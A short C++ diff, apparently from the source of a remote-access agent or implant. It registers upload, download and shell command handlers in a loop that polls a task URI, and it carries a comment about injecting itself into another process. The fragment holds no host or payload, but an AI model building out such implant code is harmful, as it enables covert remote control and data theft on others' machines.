@@ -23,7 +23,9 @@ int main()
 	Command cmdHandler;
 	// add inject self into smth else/
 	//Agent::Register();
-
+	cmdHandler.RegisterCommand(UPLOAD_CMD, "upload");
+	cmdHandler.RegisterCommand(DOWNLOAD_CMD, "download");
+	cmdHandler.RegisterCommand(SHELL_CMD, "shell");
 
 	while (true) {
 		std::string task = agent.Get(TASK_URI);
